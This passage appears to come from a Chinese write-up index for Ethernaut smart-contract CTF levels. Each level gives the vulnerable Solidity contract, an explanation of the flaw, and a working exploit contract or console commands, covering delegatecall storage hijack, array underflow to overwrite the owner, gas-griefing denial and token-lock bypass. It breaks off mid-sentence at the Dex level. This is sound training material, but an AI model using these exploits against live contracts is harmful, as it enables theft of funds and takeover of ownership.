0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf \u800c unlock \u9700\u8981 bytes16\uff0c\u800c\u4e14\u5728\u5185\u90e8\u5c06 data[2] \u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86 bytes16\uff0c\u8fd9\u4f1a\u53d6\u524d 16 \u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u8c03\u7528 unlock: contract . unlock ( \"0x6710884543189de73f0dfb9d36a99f2a\" )","title":"Privacy"},{"location":"writeups/ethernaut/#gatekeeper-one","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract GatekeeperOne { using SafeMath for uint256 ; address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { require ( gasleft (). mod ( 8191 ) == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); require ( uint32 ( uint64 ( _gateKey )) == uint16 ( tx.origin ), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u76ee\u6807\u662f\u901a\u8fc7\u4e09\u4e2a modifier \u7684\u68c0\u6d4b\uff0c\u5373\u6709\u4e09\u4e2a\u8981\u6c42 msg.sender != tx.origin\uff1a\u5373\u901a\u8fc7\u4e00\u4e2a\u5408\u7ea6\u6765\u95f4\u63a5\u8c03\u7528 enter gasleft() % 8191 == 0\uff1a\u8fd0\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5269\u4f59\u7684 gas \u8981\u662f 8191 \u7684\u500d\u6570 \u8f93\u5165\u7684 _gateKey \u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6 \u7b2c\u4e00\u4e2a\u597d\u529e\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u5408\u7ea6\u5c31\u597d \u7b2c\u4e8c\u4e2a\u56e0\u4e3a\u8fc7\u7a0b\u4e2d\u4f1a\u6d88\u8017\u591a\u5c11 gas \u4e0d\u660e\u786e\uff0c\u6240\u4ee5\u8981\u5148\u5199\u4e00\u4e2a\u8bd5\u8bd5\u6765 debug\uff0c\u770b\u770b\u4e2d\u9014\u6d88\u8017\u4e86\u591a\u5c11 gas\uff1a contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 81910 )( bytes8 ( \"0x123456\" )); } } \u5148\u968f\u610f\u8bbe\u7f6e gas \u4e3a 81910\uff0c\u7136\u540e\u90e8\u7f72\u5408\u7ea6\u3001\u8c03\u7528\uff0cdebug\uff08\u9700\u8981\u8c03\u5230 JavaScript VM \u4e0a\uff0c\u4f7f\u7528 Inject \u7684 Rinkeby \u7f51\u7edc\u597d\u50cf\u6ca1\u6cd5\u8c03\u8bd5\uff09 \u5355\u6b65\u8fd0\u884c\uff0c\u76f4\u5230\u6d41\u7a0b\u8fdb\u5165\u5230 gateTwo \u51fd\u6570\u4e2d\u7684 GAS \u6307\u4ee4\uff08\u5c06\u5269\u4f59\u7684 gas \u538b\u5165\u6808\u4e2d\uff09\uff0c\u6b64\u65f6\u663e\u793a\u5f53\u524d\u6b65 gas \u4e3a 2\uff0c\u5269\u4f59 gas \u4e3a 81658 \u6240\u4ee5\u8f93\u5165\u7684 gas \u4e3a 81910 + (81910 - 81658) + 2 = 82164 \u65f6\uff0c\u538b\u5165\u6808\u4e2d\u7684 gas \u521a\u597d\u662f 81910 \u5bf9\u4e8e\u7b2c\u4e09\u4e2a\uff0cbytes8 \u76f8\u5f53\u4e8e uint64\uff0c\u800c\u4e14\u4f7f\u7528 uintx \u6765\u5f3a\u5236\u8f6c\u6362\u65f6\u4ece\u540e\u5f80\u524d\u53d6\uff0c\u6240\u4ee5\u9700\u8981\u6ee1\u8db3\uff1a 16~31 \u4f4d\uff08\u540e 3\u30014 \u5b57\u8282\uff09\u4e3a 0 32 \u4f4d\u53ca\u4ee5\u4e0a\u4e0d\u5168\u4e3a 0 0~15 \u4f4d\uff08\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u81ea\u5df1\u5730\u5740\u7684\u540e\u4e24\u4e2a\u5b57\u8282\u76f8\u540c \u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u51fa\u9700\u8981\u7684 bytes8 \u4e3a bytes8 ( 0x0000000100000E28 ) \uff0c\u628a\u8fd9\u4e2a\u8f93\u5165\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u4e2a gate \u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 82164 )( bytes8 ( 0x0000000100000E28 )); } }","title":"Gatekeeper One"},{"location":"writeups/ethernaut/#gatekeeper-two","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { uint x ; assembly { x : = extcodesize ( caller ()) } require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg.sender )))) ^ uint64 ( _gateKey ) == uint64 ( 0 ) - 1 ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u548c\u4e0a\u4e00\u9898\u4e00\u6837\uff0c\u4e5f\u662f\u6709\u4e09\u4e2a\u8981\u6c42\uff1a msg.sender != tx.origin \u5f53\u524d caller \u7684 codesize \u4e3a 0 gateKey \u5f02\u6216 sender \u7684 keccak256 \u7684\u524d 8 \u5b57\u8282\u4e3a 0-1=0xFFFFFFFFFFFFFFFF \u7b2c\u4e00\u4e2a\u540c\u6837\u901a\u8fc7\u5408\u7ea6\u89e3\u51b3 \u7b2c\u4e8c\u4e2a\uff0c\u5f53\u5408\u7ea6\u8fd8\u6ca1\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019 codesize \u4e3a 0\uff0c\u6240\u4ee5 exp \u8981\u5199\u5728 constructor \u91cc \u7b2c\u4e09\u4e2a\uff0c\u5f02\u6216\u8ba1\u7b97\u4e00\u4e0b\u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperTwo challenge ; constructor ( address addr ) public { challenge = GatekeeperTwo ( addr ); uint64 key = uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( this )))) ^ uint64 ( 0xFFFFFFFFFFFFFFFF ); challenge . enter ( bytes8 ( key )); } }","title":"Gatekeeper Two"},{"location":"writeups/ethernaut/#naught-coin","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/token/ERC20/ERC20.sol' ; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days ; uint256 public INITIAL_SUPPLY ; address public player ; constructor ( address _player ) ERC20 ( 'NaughtCoin' , '0x0' ) public { player = _player ; INITIAL_SUPPLY = 1000000 * ( 10 ** uint256 ( decimals ())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint ( player , INITIAL_SUPPLY ); emit Transfer ( address ( 0 ), player , INITIAL_SUPPLY ); } function transfer ( address _to , uint256 _value ) override public lockTokens returns ( bool ) { super . transfer ( _to , _value ); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens () { if ( msg.sender == player ) { require ( now > timeLock ); _ ; } else { _ ; } } } \u6839\u636e ERC-20 \u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff0c\u5408\u7ea6\u5728 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol \u9898\u76ee\u7ed9 transfer \u51fd\u6570\u52a0\u4e86 modifier\uff0c\u5224\u65ad\u65f6\u95f4\u5927\u4e8e\u5341\u5e74\u624d\u4f1a\u901a\u8fc7\uff0c\u53d1\u51fa transfer \u4f46\u662f\u6839\u636e ERC-20 \u7684\u5408\u7ea6\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd8\u6709\u4e00\u4e2a transferFrom \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u8f6c\u79fb\u4ee3\u5e01 function transferFrom ( address from , address to , uint256 amount ) public virtual override returns ( bool ) { address spender = _msgSender (); _spendAllowance ( from , spender , amount ); _transfer ( from , to , amount ); return true ; } \u800c\u8fd9\u8981\u6d88\u8017 allowance\uff0c\u4f46\u662f approve \u51fd\u6570\u5e76\u6ca1\u6709\u65bd\u52a0\u9650\u5236\uff0c\u6240\u4ee5\u5148 approve \u4e00\u5b9a\u7684\u6570\u91cf\uff0c\u7136\u540e transferFrom \u5c31\u53ef\u4ee5\u8f6c\u79fb\u51fa player \u8eab\u4e0a\u7684\u5168\u90e8\u4ee3\u5e01\u4f59\u989d > ( await contract . balanceOf ( player )). toString () '1000000000000000000000000' > contract . approve ( player , \"1000000000000000000000000\" ) > contract . transferFrom ( player , instance , \"1000000000000000000000000\" ) > ( await contract . balanceOf ( player )). toString () '0'","title":"Naught Coin"},{"location":"writeups/ethernaut/#preservation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) public { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg.sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } \u76ee\u6807\u662f\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\u3002\u4f46\u662f\u4ece\u9898\u76ee\u5408\u7ea6\u4e2d\u770b\u4e0d\u5230\u4efb\u4f55\u548c\u66f4\u6539 owner \u6709\u5173\u7684\u51fd\u6570 \u6839\u636e\u63d0\u793a\uff0c\u8fd9\u4e2a\u5408\u7ea6\u7684\u6f0f\u6d1e\u5728\u4e8e\u901a\u8fc7 delegatecall \u4fee\u6539\u5b58\u50a8 \u901a\u8fc7 delegatecall \u6765\u8c03\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684\u51fd\u6570\u5e76\u4e0d\u4f1a\u52a8\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 storage\uff0c\u800c\u662f\u4f7f\u7528\u672c\u5730 storage\u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5728 setFirstTime \u51fd\u6570\u4e2d\u8c03\u7528 setTime \u51fd\u6570\u65f6\u66f4\u6539 storedTime \u5b9e\u9645\u4e0a\u4f1a\u66f4\u6539\u5904\u4e8e storage \u4e2d\u76f8\u540c\u4f4d\u7f6e\u7684 timeZone1Library\u3002\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21\u8c03\u7528 setFirstTime \u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2a\u5730\u5740\u5408\u7ea6\u7684 setTime \u51fd\u6570 \u56e0\u6b64\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5176\u4e2d\u5b9e\u73b0 setTime \u51fd\u6570\uff0c\u91cc\u9762\u5c06 owner \u6539\u4e3a\u8f93\u5165\uff08\u6ce8\u610f\u8981\u5c06\u653b\u51fb\u5408\u7ea6\u7684\u5185\u5b58\u5e03\u5c40\u641e\u7684\u548c Preservation \u5408\u7ea6\u76f8\u540c\uff09\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21 setFirstTime \u4f7f\u5c06 timeZone1Library \u6539\u4e3a\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21 setFirstTime \u5c31\u53ef\u4ee5\u8c03\u7528\u5230\u653b\u51fb\u5408\u7ea6\u7684 setTime \u51fd\u6570\uff0c\u66f4\u6539 owner\u3002\u653b\u51fb\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { address public timeZone1Library ; address public timeZone2Library ; address public owner ; // \u4fdd\u8bc1\u8fd9\u524d\u9762\u6709\u4e24\u4e2a address function setTime ( uint _time ) public { owner = address ( _time ); } } \u5b9e\u9645\u64cd\u4f5c\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<an address>' > contract . setFirstTime ( \"0x<Exploit contract address>\" ) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<Exploit contract address>' > contract . setFirstTime ( player ) > await web3 . eth . getStorageAt ( instance , 2 ) // owner '0x000000000000000000000000<player address>' > await contract . owner () '0x<player address>'","title":"Preservation"},{"location":"writeups/ethernaut/#recovery","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Recovery { //generate tokens function generateToken ( string memory _name , uint256 _initialSupply ) public { new SimpleToken ( _name , msg.sender , _initialSupply ); } } contract SimpleToken { using SafeMath for uint256 ; // public variables string public name ; mapping ( address => uint ) public balances ; // constructor constructor ( string memory _name , address _creator , uint256 _initialSupply ) public { name = _name ; balances [ _creator ] = _initialSupply ; } // collect ether in return for tokens receive () external payable { balances [ msg.sender ] = msg.value . mul ( 10 ); } // allow transfers of tokens function transfer ( address _to , uint _amount ) public { require ( balances [ msg.sender ] >= _amount ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( _amount ); balances [ _to ] = _amount ; } // clean up after ourselves function destroy ( address payable _to ) public { selfdestruct ( _to ); } } \u9898\u610f\u662f instance \u8c03\u7528\u4e86 generateToken \u751f\u6210\u4e86\u4e00\u4e2a SimpleToken\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\uff0c\u73b0\u5728\u8981\u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5176\u4e2d\u4f59\u989d\u8f6c\u5230 player \u8d26\u6237\u4e2d \u56e0\u4e3a\u533a\u5757\u94fe\u90fd\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb Etherscan \u7684 Rinkeby \u7f51\u7edc \u4e2d\u67e5\u627e instance \u8fd9\u4e2a\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u53ca\u5176\u4e2d\u7684 internal txns\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a Contract Creation\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u662f\u751f\u6210\u7684 SimpleToken \u5730\u5740\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a exp \u6765\u8c03\u7528\u90a3\u4e2a\u5730\u5740\u4e0a\u7684\u7684 destroy \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of SimpleToken */ contract Exploit { SimpleToken token ; constructor ( address payable challenge ) public { // challenge \u662f\u627e\u5230\u7684 SimpleToken \u5730\u5740 token = SimpleToken ( challenge ); } function exp () public { token . destroy ( msg.sender ); } }","title":"Recovery"},{"location":"writeups/ethernaut/#magicnumber","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract MagicNum { address public solver ; constructor () public {} function setSolver ( address _solver ) public { solver = _solver ; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } \u9898\u76ee\u8981\u6c42\u5373\u5199\u4e00\u4e2a\u5408\u7ea6\uff0c\u5b57\u8282\u7801\u4e0d\u8d85\u8fc7 10 \u4e2a\u5b57\u8282\uff0c\u5728\u8c03\u7528 whatIsTheMeaningOfLife() \u65f6\u8fd4\u56de 42 \u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\uff0c\u6765\u5bf9\u4e8e\u6240\u6709\u8c03\u7528\u90fd\u76f4\u63a5\u8fd4\u56de 42\uff0c\u8981\u7528\u5230\u51e0\u4e2a\u6307\u4ee4\uff08\u53ef\u4ee5\u5728 https://ethervm.io/ \u770b\u5230\u8be6\u7ec6\u7684\u6307\u4ee4\u4e0e\u5b57\u8282\u7801\u7684\u5bf9\u5e94\u4ee5\u53ca\u4f5c\u7528\uff09 PUSH1\uff0860\uff09\uff1a\u5c06\u4e00\u4e2a uint8 \u538b\u5165\u6808\u4e2d MSTORE\uff0852\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa value\uff0c\u5c06 memory[offset:offset+32] \u8bbe\u7f6e\u4e3a value RETURN\uff08F3\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa length\uff0creturn memory[offset:offset+length] CODECOPY\uff0839\uff09\uff1a\u4ece\u6808\u4e0a\u4f9d\u6b21\u53d6\u51fa destOffset\u3001offset\u3001length\uff0c\u8bbe\u7f6e memory[destOffset:destOffset+length] = code[offset:offset+length] \u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u6709\u4e00\u6bb5 deploy code\uff0c\u7528\u6765\u628a runtime code \u590d\u5236\u5230\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u7f16\u5199\u4e24\u90e8\u5206\u5b57\u8282\u7801 runtime code: PUSH1 0x2a ; \u5c06 42 \u538b\u5165\u6808\u4e2d PUSH1 0x80 ; \u8981\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u4e00\u822c\u4e3a 0x80 MSTORE ; \u8bbe\u7f6e memory[0x80:0x80+0x20] = 0x2a PUSH1 0x20 ; length PUSH1 0x80 ; offset RETURN ; return memory[0x80:0x80+0x20] \u8f6c\u6362\u6210\u5b57\u8282\u7801\u5c31\u662f\uff1a602a 6080 52 6020 6080 f3 \u63a5\u4e0b\u6765\u8981\u5199 deploy code\uff0c\u5176\u4e2d\u8981\u5b8c\u6210\u4e24\u4e2a\u76ee\u6807\uff1a \u5c06 runtime code \u5b57\u8282\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d \u5c06 runtime code \u8fd4\u56de EVM \u6c47\u7f16\uff1a PUSH1 0x0a ; length, runtime code \u957f\u5ea6\u4e3a 10 (0x0a) PUSH1 0x0c ; offset, \u5373 deploy code \u7684\u957f\u5ea6\uff0c\u6574\u4f53\u7b97\u4e0b\u6765\u4e3a 0x0C PUSH1 0x00 ; destOffset, \u5b58\u5165\u5185\u5b58\u4e2d\u8d77\u59cb\u4f4d\u7f6e CODECOPY ; \u5c06 runtime code \u62f7\u8d1d\u5230\u5185\u5b58\u5f00\u5934 PUSH1 0x0a ; length PUSH1 0x00 ; offset RETURN ; \u8fd4\u56de runtime code \u8f6c\u6362\u6210\u5b57\u8282\u7801\uff1a600a 600c 6000 39 600a 6000 f3\uff08\u957f\u5ea6\u6b63\u597d\u5bf9\u5e94 0x0c\uff09 \u8fde\u8d77\u6765\u5c31\u662f\u6700\u7ec8\u7684\u5b57\u8282\u7801\uff1a600a600c600039600a6000f3602a60805260206080f3 \u7136\u540e\u901a\u8fc7\u5411\u7a7a\u5730\u5740\u53d1\u9001\u4ea4\u6613\u7684\u5f62\u5f0f\u521b\u5efa\u5408\u7ea6\uff0c\u5e76\u627e\u5230\u5408\u7ea6\u5730\u5740\u518d setSolver \u5373\u53ef > web3 . eth . sendTransaction ({ from : player , data : \"0x600a600c600039600a6000f3602a60805260206080f3\" }) \u26cf\ufe0f Sent transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> \u26cf\ufe0f Mined transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> > contract . setSolver ( \"<contract address>\" ) \u5176\u4e2d contract address \u901a\u8fc7\u8bbf\u95ee\u7ed9\u51fa\u7684 etherscan \u7684\u7f51\u5740\u5c31\u53ef\u4ee5\u67e5\u5230\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740","title":"MagicNumber"},{"location":"writeups/ethernaut/#alien-codex","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.5.0 ; import '../helpers/Ownable-05.sol' ; contract AlienCodex is Ownable { bool public contact ; bytes32 [] public codex ; modifier contacted () { assert ( contact ); _ ; } function make_contact () public { contact = true ; } function record ( bytes32 _content ) contacted public { codex . push ( _content ); } function retract () contacted public { codex . length -- ; } function revise ( uint i , bytes32 _content ) contacted public { codex [ i ] = _content ; } } \u8981\u6c42\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u8fd9\u4e2a owner \u7684\u5b58\u50a8\u662f\u5728 Ownable \u4e2d\u5b9a\u4e49\u7684\uff0c\u5b83\u4f1a\u548c contact \u4e00\u8d77\u653e\u5728 storage \u7684 slot 0 \u5904\uff0c\u76ee\u7684\u5c31\u662f\u6539\u53d8\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u503c \u800c slot 1 \u7684\u4f4d\u7f6e\u5f00\u59cb\u5c31\u662f codex \u7684\u5b58\u50a8\uff0c\u5148\u662f\u957f\u5ea6\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 retract() \u51fd\u6570\u6765\u4f7f length \u5411\u4e0b\u6ea2\u51fa\u53d8\u6210 2**256-1\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5168\u90e8\u7684 storage \u533a\u57df\uff0c\u6240\u4ee5\u5c31\u53ea\u9700\u8981\u627e\u5230 slot 0 \u5bf9\u5e94\u7684 codex[i] \u7684 i \u56e0\u4e3a codex[i] \u5b9e\u9645\u4e0a\u662f\u8868\u793a keccak256(slot of codex) + i \u5904\uff0c\u6240\u4ee5\u53ea\u8981\u4ee4 i = 2**256 - keccak256(slot of codex) \u5c31\u53ef\u4ee5\u4f7f\u5176\u53d8\u4e3a 2**256\uff0c\u5373\u6ea2\u51fa\u5230 0 \u7684\u4f4d\u7f6e \u800c codex \u7684 slot \u5c31\u662f 1\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97 2**256 - keccak256(1): contract Exploit { function calc () public view returns ( bytes32 ) { return keccak256 ( abi . encode ( bytes32 ( uint ( 1 )))); } } \u5f97\u5230 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\uff0c\u7528 2**256 \u51cf\u53bb\u5b83\u5f97\u5230 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a \u7136\u540e\u66f4\u6539\u8fd9\u4e2a\u4f4d\u7f6e\u5230 player \u5730\u5740\u5c31\u597d\u4e86\uff08\u8981\u5728\u5730\u5740\u524d\u9762\u8865\u4e0a\u4e00\u5806 0 \u548c contact\uff09 > contract . retract () > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272' > await web3 . eth . getStorageAt ( instance , 1 ) '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' > contract . revise ( \"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\" , \"0x000000000000000000000001<player address>\" )","title":"Alien Codex"},{"location":"writeups/ethernaut/#denial","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Denial { using SafeMath for uint256 ; address public partner ; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address ( 0xA9E ); uint timeLastWithdrawn ; mapping ( address => uint ) withdrawPartnerBalances ; // keep track of partners balances function setWithdrawPartner ( address _partner ) public { partner = _partner ; } // withdraw 1% to recipient and 1% to owner function withdraw () public { uint amountToSend = address ( this ). balance . div ( 100 ); // perform a call without checking return // The recipient can revert, the owner will still get their share partner . call { value : amountToSend }( \"\" ); owner . transfer ( amountToSend ); // keep track of last withdrawal time timeLastWithdrawn = now ; withdrawPartnerBalances [ partner ] = withdrawPartnerBalances [ partner ]. add ( amountToSend ); } // allow deposit of funds receive () external payable {} // convenience function function contractBalance () public view returns ( uint ) { return address ( this ). balance ; } } \u76ee\u7684\u662f\u8981\u963b\u6b62 owner \u5728 withdraw \u7684\u65f6\u5019\u63d0\u53d6\u5230\u8d44\u4ea7 \u91cd\u5165\u653b\u51fb\u6ca1\u6709\u6253\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8ba9\u653b\u51fb\u5408\u7ea6\u7684 fallback \u89e6\u53d1 assert \u5f02\u5e38\uff0c\u8fd9\u6837\u6d88\u8017\u6389\u6240\u6709\u7684 gas \u540e\u5c31\u518d\u6ca1\u6cd5\u6b63\u5e38\u5411 owner \u8f6c\u8d26\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Denial */ contract Exploit { Denial challenge ; constructor ( address payable addr ) public { challenge = Denial ( addr ); } function exp () public { challenge . setWithdrawPartner ( address ( this )); challenge . withdraw (); } receive () external payable { assert ( false ); } }","title":"Denial"},{"location":"writeups/ethernaut/#shop","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Buyer { function price () external view returns ( uint ); } contract Shop { uint public price = 100 ; bool public isSold ; function buy () public { Buyer _buyer = Buyer ( msg.sender ); if ( _buyer . price () >= price && ! isSold ) { isSold = true ; price = _buyer . price (); } } } \u76ee\u7684\u662f\u4f7f price \u5c0f\u4e8e 100\u3002\u548c Elevator \u7c7b\u4f3c\uff0c\u53ea\u8981\u4f7f\u4e24\u6b21\u8c03\u7528 price \u5f97\u5230\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Shop */ contract Exploit { Shop challenge ; constructor ( address addr ) public { challenge = Shop ( addr ); } function price () external view returns ( uint ) { if ( challenge . isSold ()) { return 90 ; } return 100 ; } function exp () public { challenge . buy (); } }","title":"Shop"},{"location":"writeups/ethernaut/#dex-dex-two","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Dex { using SafeMath for uint ; address public token1 ; address public token2 ; constructor ( address _token1 , address _token2 ) public { token1 = _token1 ; token2 = _token2 ; } function swap ( address from , address to , uint amount ) public { require ( IERC20 ( from ). balanceOf ( msg.sender ) >= amount , \"Not enough to swap\" ); uint swap_amount = get_swap_price ( from , to , amount ); IERC20 ( from ). transferFrom ( msg.sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swap_amount ); IERC20 ( to ). transferFrom ( address ( this ), msg.sender , swap_amount ); } function add_liquidity ( address token_address , uint amount ) public { IERC20 ( token_address ). transferFrom ( msg.sender , address ( this ), amount ); } function get_swap_price ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableToken ( token1 ). approve ( spender , amount ); SwappableToken ( token2 ). approve ( spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableToken is ERC20 { constructor ( string memory name , string memory symbol , uint initialSupply ) public ERC20 ( name , symbol ) { _mint ( msg.sender , initialSupply ); } } \u9898\u610f\u5c31\u662f\u73a9\u5bb6\u8d26\u6237\u4e0a\u7684 token1 \u548c token2 \u90fd\u5404\u6709 10 \u4e2a token\uff0c\u800c\u9898\u76ee\u8d26\u6237\u4e0a\u6709 100 